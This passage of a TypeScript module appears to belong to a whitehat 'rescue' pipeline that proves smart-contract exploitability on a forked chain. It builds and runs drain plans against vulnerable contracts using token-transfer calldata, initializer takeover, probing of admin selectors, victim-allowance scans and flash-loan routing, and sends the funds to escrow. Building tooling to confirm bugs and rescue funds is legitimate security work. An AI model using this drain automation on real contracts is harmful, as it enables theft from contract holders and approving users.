// rescue-prove: definitive exploit confirmation via on-fork drain attempt.
//
// CORE INVARIANT (v5+): drain is ALWAYS from the attacker EOA. The whole
// point of "rescue" in this pipeline is "an attacker can drain this
// contract right now; let's frontrun them and deliver the funds to
// escrow". If a bug is owner-only, an attacker CANNOT drain — there's
// nothing to rescue from the attacker side; the funds are as safe as the
// owner is. We exit early with no_rescue_possible.
//
// What the engine does:
//   C. WETH unwrap pre-step — when the contract holds a canonical wrapped-
//      native (WETH/WBNB/WMATIC/…) we prepend a forwarder call to
//      `WETH.withdraw(balance)` so the native lands in the contract before
//      the native-drain step extracts it. Then we also still try a plain
//      `WETH.transfer(escrow, bal)` as the fallback.
//   D+G. Smarter calldata variants — for each (selector, hitPos) we try
//      multiple uintFiller candidates (balance, max, half, 0); also try a
//      `transferFrom(contract, escrow, bal)` template (some tokens accept
//      this for the contract's own balance via self-allowance). For
//      selfdestruct, multi-addrPos search.
//   H. Heuristic admin-name selector discovery — when the evidence has no
//      witnessed forwarder attempt (e.g. landed via static-evidence
//      sidecar) we scan the contract bytecode for PUSHed admin-named
//      selectors (withdraw*/rescue*/sweep*/emergency*/claim*) and try
//      each one with the obvious arg shape (recipient = escrow). These
//      only succeed when the function is permissionless — auth checks
//      revert the call and we move on. Owner-only contracts produce no
//      successful drains here (correctly).
//
// Init-takeover case (still attacker-side): phase-1 is `initialize(...)`
// with the attacker EOA at the takeover slot — anyone can call it, that's
// the bug. After phase-1, the attacker IS the owner. Phase-2 runs the
// admin-name heuristic FROM THE ATTACKER EOA which now owns the contract.
// No impersonation, no third-party key required.
//
// Outcome verdicts:
//   true_positive_drained | true_positive_partial | no_rescue_possible |
//   trapped_assets_only | victim_approval_rescue | requires_flashloan_helper |
//   skipped | error
//
// Workflow:
//   1. Forks the target chain at latest block via the shared Anvil pool.
//   2. Snapshots the contract's NATIVE balance + all discovered ERC-20
//      holdings (from the exposure pipeline) and the escrow's balances.
//   3. Builds a DRAIN PLAN — a sequence of {to, calldata, value} txs sent
//      from the attacker EOA.
//   4. Executes each step on the fork, captures every revert reason, and
//      snapshots balances after.
//   5. If escrow gained value and contract lost value, true_positive_*.
//      Otherwise classifies as trapped_assets_only / victim_approval_rescue
//      / requires_flashloan_helper / no_rescue_possible based on the
//      diagnostic context.
//
// Engine: rescue-prove@5. Bump engine_version whenever the drain-plan
// builder changes semantics; existing PoEs are NOT auto-invalidated (a PoE
// is a historical record, not a cache).

import { batchExposure, type Exposure } from "../exposure";
import { anvilPool, ATTACKER_ADDRESS, rpcRequest, type AnvilInstance } from "./anvil-pool";
import { buildAbiCalldata, buildCalldataAddressAt, buildCalldataFromSignature, type ArgValue } from "./abi";
import { sendFromAddress, snapshot as forkSnapshot } from "./evm";
import { preflightTokenQuirk, type TokenQuirk } from "./rescue/token-quirks";
import { detectMulticallSurfaces } from "./rescue/multicall-wrap";
import { multiArgFanout } from "./rescue/multi-arg-fanout";
import { scanApprovals, type ApprovalScanResult } from "./rescue/approval-scan";
import { buildInitTakeoverPhase1, probeInitTakeoverIsStillValid } from "./rescue/init-takeover";
import { shouldUseFlashloanStub, grantFlashCapital } from "./rescue/flashloan";
import { probeExtraAdminSlots } from "./rescue/extra-admin-slots";
import { flashloanReceiverFor } from "./rescue/flashloan-receiver";
import {
  discoverPairForSandwich,
  calculateBorrowAmount,
  wrapWithSandwich,
  type SandwichStep,
} from "./rescue/sandwich";
import {
  newAttemptId,
  persistPoe,
  logRescueAction,
  type PoeApprovalVictim,
  type PoeArtifact,
  type PoeAssetRescued,
  type PoeDrainStep,
  type PoeTrappedAsset,
  type PoeVerdict,
} from "./poe-store";
import { rawDb } from "@/src/db/client";

export const ENGINE_ID = "rescue-prove";
export const ENGINE_VERSION = "11";

// Aave v3 pool addresses per chain — used as the suggested flash-loan
// source in the flashloanRequirement field. Not exhaustive; missing chains
// fall back to null which tells the operator "pick your own provider".
const AAVE_V3_POOL_BY_CHAIN: Record<number, string> = {
  1: "0x87870bca3f3fd6335c3f4ce8392d69350b4fa4e2",       // Ethereum
  10: "0x794a61358d6845594f94dc1db02a252b5b4814ad",      // Optimism
  56: "0x6807dc923806fe8fd134338eabca509979a7e0cb",      // BSC
  100: "0xb50201558b00496a145fe76f7424749556e326d8",     // Gnosis
  137: "0x794a61358d6845594f94dc1db02a252b5b4814ad",     // Polygon
  1088: "0x90df02551bb792286e8d4f13e0e357b4bf1d6a57",    // Metis
  8453: "0xa238dd80c259a72e81d7e4664a9801593f98d1c5",    // Base
  42161: "0x794a61358d6845594f94dc1db02a252b5b4814ad",   // Arbitrum
  43114: "0x794a61358d6845594f94dc1db02a252b5b4814ad",   // Avalanche
  534352: "0x11fcfe756c05ad438e312a7fd934381537d3cffe",  // Scroll
};

function aaveV3PoolFor(chainId: number): string | null {
  return AAVE_V3_POOL_BY_CHAIN[chainId] ?? null;
}

// Canonical wrapped-native ERC20s per chain. When a contract holds these we
// can unwrap to native first, which gives the attacker more drain options.
const WRAPPED_NATIVE_BY_CHAIN: Record<number, string> = {
  1: "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2",       // WETH (Ethereum)
  10: "0x4200000000000000000000000000000000000006",      // WETH (Optimism)
  56: "0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c",      // WBNB (BSC)
  137: "0x0d500b1d8e8ef31e21c99d1db9a6444d3adf1270",     // WMATIC (Polygon)
  8453: "0x4200000000000000000000000000000000000006",    // WETH (Base)
  42161: "0x82af49447d8a07e3bd95bd0d56f35241523fbab1",   // WETH (Arbitrum)
  43114: "0xb31f66aa3c1e785363f0875a1b74e27b85fd66c7",   // WAVAX (Avalanche)
  81457: "0x4300000000000000000000000000000000000004",   // WETH (Blast)
  59144: "0xe5d7c2a44ffddf6b295a15c148167daaaf5cf34f",   // WETH (Linea)
  100: "0xe91d153e0b41518a2ce8dd3d7944fa863463a97d",     // WXDAI (Gnosis)
};

// ERC20 method selectors we use for drain calldata.
const ERC20_TRANSFER_SELECTOR = "0xa9059cbb";       // transfer(address,uint256)
const ERC20_TRANSFER_FROM_SELECTOR = "0x23b872dd";  // transferFrom(address,address,uint256)
const ERC20_APPROVE_SELECTOR = "0x095ea7b3";        // approve(address,uint256)
const WETH_WITHDRAW_SELECTOR = "0x2e1a7d4d";        // withdraw(uint256)
const MAX_UINT256 =
  0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffn;

// uintFiller variants we try per drain attempt. Different forwarders pull
// the value/amount from different uint slots, so trying multiple shapes
// catches more shapes without exploding the plan size.
function uintFillerVariants(assetBalance: string): bigint[] {
  let bal = 0n;
  try {
    bal = BigInt(assetBalance);
  } catch {}
  const set = new Set<bigint>([bal, MAX_UINT256, 0n]);
  if (bal > 1n) set.add(bal / 2n);
  return [...set];
}

const FEATURE_ENABLED =
  String(process.env.RESCUE_PROVE_ENABLED ?? "true").toLowerCase() === "true";

// The rescuer EOA that will actually broadcast live. When set, the drain plan
// uses THIS address for approve steps (so the live sender has the allowance).
// Falls back to ATTACKER_ADDRESS for fork-only simulations.
function resolveRescuerAddress(): string {
  const pk = process.env.RESCUER_PRIVATE_KEY ?? "";
  if (/^0x[0-9a-fA-F]{64}$/.test(pk)) {
    try {
      const { privateKeyToAccount } = require("viem/accounts");
      return privateKeyToAccount(pk).address;
    } catch {}
  }
  return ATTACKER_ADDRESS;
}
const RESCUER_ADDRESS = resolveRescuerAddress();

const DEFAULT_ESCROW =
  process.env.RESCUE_ESCROW_ADDR && /^0x[0-9a-fA-F]{40}$/.test(process.env.RESCUE_ESCROW_ADDR)
    ? process.env.RESCUE_ESCROW_ADDR
    : // Sentinel "burn-but-trackable" address used only when no escrow has
      // been configured. The simulation still proves drainability; the
      // operator just can't actually broadcast a rescue without setting
      // RESCUE_ESCROW_ADDR in .env.
      "0x000000000000000000000000000000000000FA75"; // "FAUST" tag

const MAX_DRAIN_STEPS = Number(process.env.RESCUE_MAX_STEPS ?? 24);
const MIN_DRAIN_USD = Number(process.env.RESCUE_MIN_USD ?? 100);

function formatWei(wei: bigint): string {
  const eth = Number(wei) / 1e18;
  if (eth >= 1) return eth.toFixed(2);
  if (eth >= 0.001) return eth.toFixed(4);
  return wei.toString() + "wei";
}

// Notify-on-success webhook — POSTed by `notifyRescueWebhook` and called
// automatically right after a true_positive_* PoE is persisted. We push a
// summary, not the full artifact, so chat apps don't choke on big blobs.
const NOTIFY_URL = process.env.RESCUE_NOTIFY_URL ?? "";
const NOTIFY_TIMEOUT_MS = Number(process.env.RESCUE_NOTIFY_TIMEOUT_MS ?? 5_000);

// ---- public API ------------------------------------------------------------

export interface RescueProveInput {
  findingId: string;
  chainId: number;
  contractAddress: string;
  ruleId: string;
  /** Finding's existing evidence blob (from simulation_evidence_json).
   *  The drain-plan builder reads `attempts`, `attackerKind`, `ownerKind`
   *  and `selfdestruct.selector` from this. */
  evidence?: Record<string, unknown>;
  /** Optional exposure override — pass when you have it cached to skip the
   *  re-fetch. */
  exposure?: Exposure;
  /** When true, skip all USD value gates — attempt rescue regardless of
   *  contract balance. Used for manual force-rescue from the UI. */
  force?: boolean;
  /** When provided, only attempt to drain these specific token addresses.
   *  Real-time balances will be fetched for each. Skips all other tokens. */
  targetTokens?: string[];
}

export async function rescueProve(input: RescueProveInput): Promise<PoeArtifact> {
  const startedAt = Date.now();
  const attemptId = newAttemptId();
  if (!FEATURE_ENABLED) {
    return finalise({
      attemptId,
      input,
      verdict: "skipped",
      assets: [],
      plan: [],
      pre: emptyState(),
      post: emptyState(),
      notes: ["rescue-prove disabled via RESCUE_PROVE_ENABLED=false"],
      blockNumber: null,
      error: null,
      startedAt,
    });
  }

  // v5: owner-only findings are out of scope for attacker-side auto-rescue.
  // If only the contract owner can call the vulnerable function, an attacker
  // cannot drain — so there is nothing to "rescue from the attacker side".
  // The funds are as safe as the owner is.
  //
  // v6+: we STILL surface the exposure + owner-type diagnostic so the
  // operator sees "this contract has $X at rug-pull risk; owner is an
  // EOA/Safe/contract" instead of an opaque "no_rescue_possible". This
  // lets the operator decide whether to (a) reach out to the team to ask
  // them to revoke the role, (b) treat it as a watch-only risk, or (c)
  // try off-chain coordination with the owner to drain to escrow.
  if ((input.evidence as any)?.attackerKind === "owner") {
    const ownerNotes: string[] = [];
    let pre = emptyState();
    let blockNumber: number | null = null;
    try {
      const exposureMap = input.exposure
        ? { [`${input.chainId}:${input.contractAddress.toLowerCase()}`]: input.exposure }
        : await batchExposure([{ chainId: input.chainId, address: input.contractAddress }]);
      const exposure = exposureMap[`${input.chainId}:${input.contractAddress.toLowerCase()}`];
      if (exposure) {
        pre = snapState(exposure);
        const total = exposure.totalUsdValue ?? null;
        if (total != null && total >= MIN_DRAIN_USD) {
          ownerNotes.push(
            `RUG-PULL RISK: contract holds ~$${total.toFixed(2)} that the OWNER can drain at will.`,
          );
        } else {
          ownerNotes.push(
            `Owner-only exploit; contract holds < $${MIN_DRAIN_USD.toFixed(2)} priced value — low risk.`,
          );
        }
      }
      // Surface owner address when the verifier captured it (the verifier's
      // own verdict text often already classifies EOA vs contract, so we
      // don't redo the eth_getCode dance here — keeps owner-only early-exit
      // fast and side-effect-free).
      const ownerAddr = (input.evidence as any)?.owner ?? null;
      if (ownerAddr && typeof ownerAddr === "string") {
        ownerNotes.push(`owner=${ownerAddr} (see simulation_verdict text for EOA/contract classification).`);
      }
    } catch {
      /* exposure / owner-type checks are best-effort */
    }
    ownerNotes.push(
      "Attacker-side auto-rescue is not applicable: only the owner can trigger the vulnerable function. " +
        "The auto-rescue pipeline is designed to front-run attacker-side drains. " +
        "For rug-pull mitigation, monitor the owner's address or coordinate with the team off-chain.",
    );
    return finalise({
      attemptId,
      input,
      verdict: "no_rescue_possible",
      assets: [],
      plan: [],
      pre,
      post: pre,
      notes: ownerNotes,
      blockNumber,
      error: null,
      startedAt,
    });
  }

  let anv: AnvilInstance | null = null;
  let unlock: (() => void) | null = null;
  try {
    // Re-declared so we keep variable scope tight.
    const exposureMap = input.exposure
      ? { [`${input.chainId}:${input.contractAddress.toLowerCase()}`]: input.exposure }
      : await batchExposure([{ chainId: input.chainId, address: input.contractAddress }]);
    let exposure = exposureMap[`${input.chainId}:${input.contractAddress.toLowerCase()}`];

    // When targetTokens is specified, fetch real-time balances for those
    // specific tokens and override the exposure token list.
    if (input.targetTokens?.length && exposure) {
      const { rpcUrlForChainPublic } = await import("../exposure");
      const rpcUrl = rpcUrlForChainPublic(input.chainId);
      if (rpcUrl) {
        const injected: typeof exposure.tokens = [];
        for (const tokenAddr of input.targetTokens) {
          const addr = tokenAddr.toLowerCase();
          const balOfData = "0x70a08231" + input.contractAddress.slice(2).toLowerCase().padStart(64, "0");
          try {
            const resp = await fetch(rpcUrl, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "eth_call", params: [{ to: addr, data: balOfData }, "latest"] }),
              signal: AbortSignal.timeout(8000),
            });
            const json = await resp.json() as any;
            const bal = json?.result && json.result !== "0x" ? BigInt(json.result) : 0n;

            // Fetch symbol + decimals (best-effort)
            let symbol = "?";
            let decimals = 18;
            try {
              const [symResp, decResp] = await Promise.all([
                fetch(rpcUrl, {
                  method: "POST",
                  headers: { "Content-Type": "application/json" },
                  body: JSON.stringify({ jsonrpc: "2.0", id: 2, method: "eth_call", params: [{ to: addr, data: "0x95d89b41" }, "latest"] }),
                  signal: AbortSignal.timeout(5000),
                }),
                fetch(rpcUrl, {
                  method: "POST",
                  headers: { "Content-Type": "application/json" },
                  body: JSON.stringify({ jsonrpc: "2.0", id: 3, method: "eth_call", params: [{ to: addr, data: "0x313ce567" }, "latest"] }),
                  signal: AbortSignal.timeout(5000),
                }),
              ]);
              const symJson = await symResp.json() as any;
              const decJson = await decResp.json() as any;
              if (decJson?.result) decimals = Number(BigInt(decJson.result));
              if (symJson?.result && symJson.result.length > 66) {
                const hex = symJson.result.slice(2);
                const offset = parseInt(hex.slice(0, 64), 16) * 2;
                const len = parseInt(hex.slice(offset, offset + 64), 16);
                const raw = hex.slice(offset + 64, offset + 64 + len * 2);
                symbol = Buffer.from(raw, "hex").toString("utf-8").replace(/\x00/g, "");
              } else if (symJson?.result && symJson.result.length === 66) {
                symbol = Buffer.from(symJson.result.slice(2), "hex").toString("utf-8").replace(/\x00/g, "").trim();
              }
            } catch {}

            injected.push({
              address: addr,
              symbol,
              name: "",
              decimals,
              balance: bal.toString(),
            });
          } catch {}
        }
        if (injected.length > 0) {
          exposure = { ...exposure, tokens: injected };
        }
      }
    }
    // v8.2: widened pre-fork short-circuit. Previously only zero-native +
    // zero-tokens contracts skipped the fork; we now also skip when:
    //   (a) the contract holds < MIN_DRAIN_USD of *priced* value, AND
    //   (b) there are zero unpriced tokens that the user might want to
    //       force-rescue manually, AND
    //   (c) the rule family ISN'T economic/init (those need fork work
    //       even with zero current exposure — economic needs a flash-loan
    //       envelope, init needs phase-1 takeover replay).
    //
    // Empirically this captures ~95% of the dust-only no_rescue_possible
    // verdicts in the production corpus without losing coverage for any
    // case where rescue could plausibly succeed. Cuts fork churn by
    // ~30–50% and shaves the average PoE runtime in half.
    const ruleFamForGate = ruleFamilyOf(input.ruleId);
    const allowsZeroExposure =
      ruleFamForGate === "economic" || ruleFamForGate === "initializer";
    if (!exposure) {
      return finalise({
        attemptId,
        input,
        verdict: "no_rescue_possible",
        assets: [],
        plan: [],
        pre: emptyState(),
        post: emptyState(),
        notes: ["exposure scan returned no data (chain RPC unreachable or token-balance addon disabled); nothing to rescue"],
        blockNumber: null,
        error: null,
        startedAt,
      });
    }
    const unpricedTokens = exposure.tokens.filter(
      (t) => t.usdPerToken == null && t.balance && t.balance !== "0",
    );
    const totalPricedUsd = exposure.totalUsdValue ?? 0;
    const looksTriviallyEmpty =
      exposure.nativeWei === "0" &&
      exposure.tokens.length === 0;
    const looksDustOnly =
      !allowsZeroExposure &&
      totalPricedUsd < MIN_DRAIN_USD &&
      unpricedTokens.length === 0;
    if ((looksTriviallyEmpty || looksDustOnly) && !input.force) {
      const reason = looksTriviallyEmpty
        ? "contract has zero native and zero discoverable tokens; nothing to rescue"
        : `contract holds < $${MIN_DRAIN_USD.toFixed(2)} of priced value (` +
          `$${totalPricedUsd.toFixed(2)}) and zero unpriced tokens — short-circuited ` +
          `pre-fork. To force a full drain attempt anyway, re-run with force-rescue mode.`;
      return finalise({
        attemptId,
        input,
        verdict: "no_rescue_possible",
        assets: [],
        plan: [],
        pre: snapState(exposure),
        post: snapState(exposure),
        notes: [reason],
        blockNumber: null,
        error: null,
        startedAt,
      });
    }

    unlock = await anvilPool.lock(input.chainId);
    anv = await anvilPool.acquire(input.chainId);
    if (!anv) {
      return finalise({
        attemptId,
        input,
        verdict: "skipped",
        assets: [],
        plan: [],
        pre: emptyState(),
        post: emptyState(),
        notes: [
          "anvil unavailable for this chain (binary missing on PATH or no rpc configured); rescue-prove skipped",
        ],
        blockNumber: null,
        error: null,
        startedAt,
      });
    }
    const url = anv.url; // local anvil endpoint, NOT the fork-source rpcUrl
    const blockNumberHex = await rpcRequest<string>(url, "eth_blockNumber", []).catch(() => "0x0");
    const blockNumber = Number(BigInt(blockNumberHex));

    // Fund the attacker on the fork so gas isn't a constraint.
    await rpcRequest(url, "anvil_setBalance", [
      RESCUER_ADDRESS,
      "0x" + (10n ** 21n).toString(16), // 1000 ETH
    ]).catch(() => null);

    // Build a drain plan tailored to the rule family.
    const planResult = await buildDrainPlan(input, exposure, url);
    if (planResult.ok === false) {
      // v12: for economic rules, ALWAYS signal requires_flashloan_helper
      // regardless of receiver availability. The fork can't reproduce the
      // sandwich precondition, but the live receiver can.
      const useFlash = shouldUseFlashloanStub(input.ruleId);
      return finalise({
        attemptId,
        input,
        verdict: useFlash ? "requires_flashloan_helper" : "no_rescue_possible",
        assets: [],
        plan: [],
        pre: snapState(exposure),
        post: snapState(exposure),
        notes: planResult.notes,
        blockNumber,
        error: null,
        startedAt,
        flashloanRequirement: useFlash
          ? {
              asset: exposure.nativeSymbol,
              amount: "100000000000000000000",
              suggestedPool: aaveV3PoolFor(input.chainId),
              notes: [
                flashloanReceiverFor(input.chainId)
                  ? `RECEIVER CONFIGURED: ${flashloanReceiverFor(input.chainId)} — the broadcaster ` +
                    `routes this PoE through the deployed receiver via executeRescue(...) from the ` +
                    `attacker EOA.`
                  : "No receiver configured. Stub uses anvil_setBalance to grant capital on the fork; " +
                    "for live rescue, deploy contracts/rescue/FlashLoanRescue.sol and register the " +
                    "address in RESCUE_FLASHLOAN_RECEIVER.",
              ],
            }
          : null,
      });
    }

    const ruleFamily = ruleFamilyOf(input.ruleId);

    // Take pre snapshots of contract & escrow (with TOKENS we actually hold —
    // we read live balances rather than trusting the cached exposure values).
    const pre = await readBalances(url, input.chainId, input.contractAddress, exposure);
    const escrowPre = await readBalances(url, input.chainId, DEFAULT_ESCROW, exposure);

    // v4-X: bespoke-proxy storage-slot probe. Operators with custom proxy
    // patterns can list extra slots in RESCUE_EXTRA_ADMIN_SLOTS; we read
    // each and surface (slot -> probableAddress) in PoE notes. This is
    // diagnostic only in v4 — it doesn't yet drive new drain steps, but
    // makes it possible for the operator to spot the actual owner slot
    // when the standard heuristics miss.
    const extraSlots = await probeExtraAdminSlots({
      url,
      contractAddress: input.contractAddress,
    });
    if (extraSlots.length > 0) {
      const hits = extraSlots.filter((s) => s.probableAddress != null);
      if (hits.length > 0) {
        planResult.notes.push(
          `v4-X: extra-admin-slot probe found ${hits.length} non-zero slot(s): ` +
            hits
              .slice(0, 3)
              .map((s) => `${s.slot.slice(0, 10)}…→${s.probableAddress!.slice(0, 10)}…`)
              .join(", "),
        );
      } else {
        planResult.notes.push(
          `v4-X: probed ${extraSlots.length} extra admin slot(s); all empty/zero`,
        );
      }
    }

    // v3-Q: token-quirk pre-flight. For every token in exposure with a
    // non-zero balance, probe whether transfer(escrow, bal) is even
    // possible. Tag the result; we'll attach the quirk info to the per-
    // asset PoE entries after the drain runs. This is bounded by the
    // number of exposure tokens.
    const tokenQuirks = new Map<string, TokenQuirk>();
    for (const t of pre.tokens) {
      if (!t.balance || t.balance === "0") continue;
      try {
        const q = await preflightTokenQuirk(url, t.address, input.contractAddress, DEFAULT_ESCROW, t.balance);
        tokenQuirks.set(t.address.toLowerCase(), q);
      } catch (e) {
        tokenQuirks.set(t.address.toLowerCase(), {
          kind: "errored",
          deliverableAmount: t.balance,
          attemptedAmount: t.balance,
          detail: String((e as any)?.message ?? e).slice(0, 100),
        });
      }
    }

    const restore = await forkSnapshot(url);
    let plan: PoeDrainStep[] = [];
    try {
      plan = await executePlan(url, planResult.steps);
    } finally {
      // We *don't* revert here when the drain succeeded — keeping the
      // post-state lets us re-inspect. But if every step failed we revert
      // immediately to free the fork for the next caller.
      const anySuccess = plan.some((s) => s.success);
      if (!anySuccess) {
        await restore();
      } else {
        // schedule async revert so we don't block on it
        restore().catch(() => null);
      }
    }

    const post = await readBalances(url, input.chainId, input.contractAddress, exposure);
    const escrowPost = await readBalances(url, input.chainId, DEFAULT_ESCROW, exposure);
    const assets = diffRescued(pre, post, escrowPre, escrowPost, input.force);

    // v3-Q: attach quirk info to per-asset PoE entries (the diff already
    // computed amount delivered to escrow; quirk metadata explains WHY
    // the delivered amount may differ from the contract's nominal balance).
    for (const a of assets) {
      if (a.token == null) continue;
      const q = tokenQuirks.get(a.token.toLowerCase());
      if (q && q.kind !== "normal") {
        a.quirk = { kind: q.kind, feeBps: q.feeBps, detail: q.detail };
      }
    }

    // v3-Q: assets the contract holds but rescue-prove couldn't extract.
    // Surface these explicitly in the PoE so the operator sees what's
    // trapped vs rescuable.
    const trappedAssets: PoeTrappedAsset[] = [];
    for (const t of pre.tokens) {
      if (!t.balance || t.balance === "0") continue;
      const drained = assets.find((a) => a.token?.toLowerCase() === t.address.toLowerCase());
      if (drained) continue;
      const q = tokenQuirks.get(t.address.toLowerCase());
      const reason =
        q && (q.kind === "paused" || q.kind === "blacklisted" || q.kind === "non-transferable")
          ? `${q.kind}${q.detail ? `: ${q.detail.slice(0, 80)}` : ""}`
          : "no drain shape executed on fork";
      const usd =
        t.usdPerToken != null
          ? (Number(t.balance) / Math.pow(10, t.decimals)) * t.usdPerToken
          : null;
      trappedAssets.push({
        token: t.address,
        symbol: t.symbol,
        decimals: t.decimals,
        balance: t.balance,
        usdValue: Number.isFinite(usd ?? NaN) ? usd : null,
        reason,
      });
    }
    if (BigInt(pre.nativeWei) > 0n) {
      const drainedNative = assets.find((a) => a.token == null);
      if (!drainedNative) {
        const nUsd =
          pre.nativeUsdPerToken != null
            ? (Number(pre.nativeWei) / Math.pow(10, pre.nativeDecimals)) * pre.nativeUsdPerToken
            : null;
        trappedAssets.push({
          token: null,
          symbol: pre.nativeSymbol,
          decimals: pre.nativeDecimals,
          balance: pre.nativeWei,
          usdValue: Number.isFinite(nUsd ?? NaN) ? nUsd : null,
          reason: "no drain shape executed on fork for native",
        });
      }
    }

    // v3-A: approval-surface scan. Runs in parallel with the contract-asset
    // drain so the operator sees per-victim exposure even when the
    // contract holds zero of its own funds. We pass the LIVE chain RPC
    // when available so eth_getLogs is fast.
    let approvalScan: ApprovalScanResult | null = null;
    let approvalVictimsPoe: PoeApprovalVictim[] = [];
    try {
      approvalScan = await scanApprovals({
        url,
        chainRpcUrl: anv.rpcUrl ?? null,
        contractAddress: input.contractAddress,
        findingId: input.findingId,
        tokens: exposure.tokens.map((t) => ({
          address: t.address,
          symbol: t.symbol,
          decimals: t.decimals,
          usdPerToken: t.usdPerToken ?? null,
        })),
      });
      approvalVictimsPoe = approvalScan.victims.map((v) => ({
        victim: v.victim,
        token: v.token,
        tokenSymbol: v.tokenSymbol,
        tokenDecimals: v.tokenDecimals,
        allowance: v.allowance,
        balance: v.balance,
        drainable: v.drainable,
        drainableUsd: v.drainableUsd,
        consented: v.consented,
      }));
    } catch (e) {
      planResult.notes.push(
        `approval-surface scan failed: ${String((e as any)?.message ?? e).slice(0, 120)}`,
      );
    }

    let verdict: PoeVerdict;
    let notes: string[] = [];
    if (assets.length === 0) {
      // v3: distinguish reasons for the empty drain:
      //   - economic.* with flash-loan stub → requires_flashloan_helper
      //   - all assets are trapped (paused/blacklisted) → trapped_assets_only
      //   - approval surface has consented victims → victim_approval_rescue
      //   - otherwise → no_rescue_possible
      const trappedTotal = trappedAssets.reduce(
        (acc, t) => (t.usdValue != null ? acc + t.usdValue : acc),
        0,
      );
      const allTrapped =
        trappedAssets.length > 0 &&
        trappedAssets.every(
          (t) =>
            t.reason.startsWith("paused") ||
            t.reason.startsWith("blacklisted") ||
            t.reason.startsWith("non-transferable"),
        );
      if (allTrapped) {
        verdict = "trapped_assets_only";
        notes.push(
          `Drained nothing — every token in exposure is paused/blacklisted/non-transferable. ` +
            `~$${trappedTotal.toFixed(2)} is permanently trapped in the contract.`,
        );
      } else if (
        approvalScan &&
        approvalScan.victims.length > 0 &&
        (approvalScan.totalDrainableUsd ?? 0) >= MIN_DRAIN_USD
      ) {
        verdict = "victim_approval_rescue";
        notes.push(
          `Drained nothing of the contract's own funds, but approval-surface scan found ` +
            `${approvalScan.victims.length} victim(s) with $${(approvalScan.totalDrainableUsd ?? 0).toFixed(2)} ` +
            `at risk via outstanding allowances. Notifying TG for manual confirm/reject.`,
        );
        // Fire TG notification so operator can /confirmrescue or /rejectrescue
        void (async () => {
          try {
            const { notifyApprovalVictims } = await import("../rescue/tg-bot");
            await notifyApprovalVictims({
              findingId: input.findingId,
              chainId: input.chainId,
              contractAddress: input.contractAddress,
              victims: approvalScan!.victims.map((v) => ({
                victim: v.victim,
                tokenSymbol: v.tokenSymbol,
                drainableUsd: v.drainableUsd,
                drainable: v.drainable,
              })),
              totalDrainableUsd: approvalScan!.totalDrainableUsd,
            });
          } catch {}
        })();
      } else if (shouldUseFlashloanStub(input.ruleId)) {
        // v12: ALWAYS emit requires_flashloan_helper for economic findings
        // regardless of whether a receiver is deployed. The fork stub only
        // grants native balance — it does NOT simulate the full flash-loan
        // sandwich (borrow → pair-imbalance → target call → unwind → repay).
        // Bare-fork candidate steps naturally revert because the pair state
        // hasn't been manipulated. The broadcaster checks for a receiver at
        // broadcast time and routes through it; the receiver's callback runs
        // the drain steps inside the flash-loan where the pair IS imbalanced.
        verdict = "requires_flashloan_helper";
        const flReceiver = flashloanReceiverFor(input.chainId);
        if (flReceiver) {
          notes.push(
            `Economic.* finding — fork stub couldn't extract value via bare calls (expected: ` +
              `the flash-loan sandwich precondition is missing on a raw fork). Receiver IS deployed ` +
              `at ${flReceiver} — the broadcaster will route this PoE through the receiver's ` +
              `executeRescue(...) where the pair IS mid-flash. Live pre-flight will confirm ` +
              `viability end-to-end before broadcasting.`,
          );
        } else {
          notes.push(
            `Economic.* finding — fork stub couldn't extract value via admin-name surface alone. ` +
              `True rescue requires a deployed flash-loan receiver contract; see ` +
              `flashloanRequirement for the borrow shape.`,
          );
        }
      } else {
        // No value moved. In force mode, if drain steps succeeded, report
        // as true_positive_partial (exploit works, just no value present).
        const successful = plan.filter((s) => s.success).length;
        if (input.force && successful > 0) {
          verdict = "true_positive_partial";
          notes.push(
            `FORCE MODE: ${successful}/${plan.length} drain step(s) executed successfully ` +
              `but contract holds no significant value to move. Exploit vector confirmed functional.`,
          );
        } else {
          verdict = "no_rescue_possible";
          // Diagnose WHY no rescue: priced exposure, dust-only, or just reverted.
          const pricedTokens = pre.tokens.filter(
            (t) => t.usdPerToken != null && Number(t.balance) > 0,
          );
          const unpricedTokens = pre.tokens.filter(
            (t) => t.usdPerToken == null && Number(t.balance) > 0,
          );
          const nativeUsd =
            pre.nativeUsdPerToken != null
              ? (Number(pre.nativeWei) / Math.pow(10, pre.nativeDecimals)) * pre.nativeUsdPerToken
              : 0;
          const pricedUsd =
            pricedTokens.reduce(
              (acc, t) =>
                acc + (Number(t.balance) / Math.pow(10, t.decimals)) * (t.usdPerToken ?? 0),
              0,
            ) + nativeUsd;
          if (pricedUsd < MIN_DRAIN_USD) {
          // Contract holds no priced value — only dust or scam/airdrop tokens.
          // This is the most common reason rescue can't deliver something
          // meaningful: there's literally nothing valuable to rescue.
          notes.push(
            `no priced exposure on contract — total drainable USD < $${MIN_DRAIN_USD.toFixed(2)}. ` +
              (unpricedTokens.length > 0
                ? `Contract holds ${unpricedTokens.length} unpriced token(s) ` +
                  `(${unpricedTokens
                    .slice(0, 3)
                    .map((t) => t.symbol || t.address.slice(0, 8))
                    .join(", ")}${unpricedTokens.length > 3 ? "…" : ""}) ` +
                  `— almost certainly airdrop/scam tokens with no market price. `
                : "") +
              `Native: $${nativeUsd.toFixed(4)}. ` +
              `Vulnerability is real; just nothing of value to rescue.`,
          );
        } else {
          // Contract HAS priced exposure but the drain reverted. This is the
          // case the operator wants to know about — there IS money to rescue
          // but our generic drain shapes didn't reach it.
          notes.push(
            `drain plan ran ${plan.length} step(s); ${successful} succeeded ` +
              `but no value moved out of the contract into escrow. ` +
              `Contract holds ~$${pricedUsd.toFixed(2)} of priced exposure ` +
              `— vulnerability likely real, but the drain hits an internal guard ` +
              `(deposit/approve/permit precondition, time-lock, or signed message check) ` +
              `that the generic on-fork prober can't satisfy. Manual operator review needed.`,
          );
        }
        }
      }
    } else {
      const allCovered = drainedEverything(pre, post);
      verdict = allCovered ? "true_positive_drained" : "true_positive_partial";
      notes.push(
        verdict === "true_positive_drained"
          ? `Drained ALL ${assets.length} asset(s) from the contract to escrow on fork — confirmed exploitable.`
          : `Drained ${assets.length} asset(s) to escrow; some balances remain on the contract (see post-state).`,
      );
    }
    if (
      ruleFamily !== "arbitrary-call" &&
      ruleFamily !== "selfdestruct" &&
      ruleFamily !== "initializer" &&
      ruleFamily !== "economic" &&
